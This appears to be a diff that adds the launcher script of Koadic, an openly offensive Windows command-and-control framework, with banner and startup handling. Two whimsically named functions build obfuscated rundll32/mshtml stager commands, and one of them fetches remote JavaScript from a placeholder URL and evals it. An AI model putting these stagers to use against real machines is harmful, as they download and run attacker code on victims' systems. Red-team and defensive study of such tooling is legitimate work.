@@ -1,0 +1,179 @@
+#!/usr/bin/env python3
+# Copyright (c) 2016 - 2018 RiskSense, Inc.
+#
+# Licensed under the Apache License, Version 2.0 (the "License"); you may not
+# use the software except in compliance with the License.
+#
+# You may obtain a copy of the License at:
+#
+#    http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
+# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
+# License for the specific language governing permissions and limitations under
+# the License.
+
+# Disclaimer:
+# Usage of Koadic for attacking targets without prior mutual consent is illegal.
+# It is the end user's responsibility to obey all applicable local, state,
+# federal, and international laws. Developers assume no liability and are not
+# responsible for any misuse or damage caused by this program.
+
+__version_info__ = (0, "B") # Permanent Alpha
+__version__ = "x".join(map(str, __version_info__))
+__license__ = "Apache 2.0"
+__credits__ = ["zerosum0x0", "jmage", "TheNaterz", "aleph-naught-", "barballs"]
+
+def createHolidayList():
+    holidays = dict()
+    holidays[datetime.date(datetime.date.today().year, 2, 14)] = 'data/valentine.txt'
+    holidays[datetime.date(datetime.date.today().year, 3, 17)] = 'data/shamrock.txt'
+    return holidays
+
+def createWeekList():
+    weekly = dict()
+    weekly[1] = 'data/taco.txt'
+    weekly[4] = 'data/pabst.txt'
+    return weekly
+
+def pay_no_attention():
+    import random
+    import string
+
+    bignumber = 20
+
+    command = "rundll32"
+    command += " ~URL~"
+
+    dotpath = []
+
+    for i in range(0, 3):
+        dotpath.append('..')
+
+    for i in range(0, bignumber):
+        dotpath.append('.')
+
+    random.shuffle(dotpath)
+
+    path = ""
+    dotpathwithslashes = []
+    for i in dotpath:
+        dotpathwithslashes.append("\\" + i)
+
+    path = ''.join(dotpathwithslashes)
+    path += "\\"
+
+    command += path + "mshtml"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
+    command += ","
+    command += " "
+    command += "RunHTMLApplication"
+
+    command = "rundll32.exe ~URL~\\..\\..\\..\\mshtml,RunHTMLApplication"
+
+    with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
+        f.write(command+"\n")
+
+def seriously_nothing_shady_here():
+    import random
+    import string
+
+    bignumber = 20
+
+    coin = [True,False]
+    command = "rundll32"
+    command += " javascript:\""
+
+    dotpath = []
+
+    for i in range(0, random.randint(1,3)):
+        dotpath.append('..')
+
+    for i in range(0, bignumber):
+        dotpath.append('.')
+
+    random.shuffle(dotpath)
+
+    path = ""
+    slashes = ["\\"]
+    dotpathwithslashes = []
+
+    for i in dotpath:
+        dotpathwithslashes.append(random.choice(slashes) + i)
+
+    if dotpathwithslashes[0] == '..' or dotpathwithslashes[0] == '.':
+        tmp = dotpathwithslashes[0]
+        dotpathwithslashes = dotpathwithslashes[1:]
+        random.shuffle(dotpathwithslashes)
+        dotpathwithslashes.insert(0, tmp)
+    else:
+        random.shuffle(dotpathwithslashes)
+
+    path = ''.join(dotpathwithslashes)
+    path += random.choice(slashes)
+
+    command += path + "mshtml"
+    command += ''.join([random.choice([',',' ']) for i in range(0,random.randint(20,40))])
+    command += ","
+    command += " "
+    command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"
+
+    command = """rundll32.exe javascript:"\\..\\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","~URL~",false);x.send();eval(x.responseText);window.close();"""
+
+    with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
+        f.write(command+"\n")
+
+def find_center(banner):
+    import re
+    max_l = 0
+    for l in banner.splitlines():
+        reaesc = re.compile(r'\x1b[^m]*m')
+        new_l = reaesc.sub('', l)
+        if len(new_l) > max_l:
+            max_l = len(new_l)
+    return int(max_l/2)
+
+def reposition_info(info, center):
+    base_spaces = 1
+    if center > 20:
+        base_spaces = center-20
+    return (info % (' '*base_spaces, ' '*(base_spaces+4), ' '*(base_spaces+11), ' '*(base_spaces+10), 's', ' '*(base_spaces+10), 'd', ' '*(base_spaces+10), 'd' ))
+
+if __name__ == "__main__":
+    import core.shell
+    import argparse
+    import datetime
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--autorun", help="a file containing commands to autorun at startup")
+    parser.add_argument("-o", action="store_true", help="it is tuesday my dudes")
+    parser.add_argument("--restore", help="a koadic restore json file")
+    args = parser.parse_args()
+    autorun = open(args.autorun).read().split("\n") if args.autorun else []
+    if args.restore:
+        import json
+        restore = json.loads(open(args.restore).read())
+    else:
+        restore = {}
+
+    #events
+    events = createHolidayList()
+    weekly = createWeekList()
+
+    if args.o:
+        banner = open("data/taco.txt", "rb").read().decode("unicode_escape")
+    elif datetime.date.today() in events:
+        banner = open(events[datetime.date.today()], "rb").read().decode("unicode_escape")
+    elif datetime.date.today().weekday() in weekly:
+        banner = open(weekly[datetime.date.today().weekday()], "rb").read().decode("unicode_escape")
+    else:
+        banner = open("data/banner.txt", "rb").read().decode("unicode_escape")
+
+    banner += reposition_info(open("data/banner_info.txt", "rb").read().decode("unicode_escape"), find_center(banner))
+
+    # pay_no_attention()
+    # seriously_nothing_shady_here()
+
+    shell = core.shell.Shell(banner, __version__)
+    shell.run(autorun, restore)
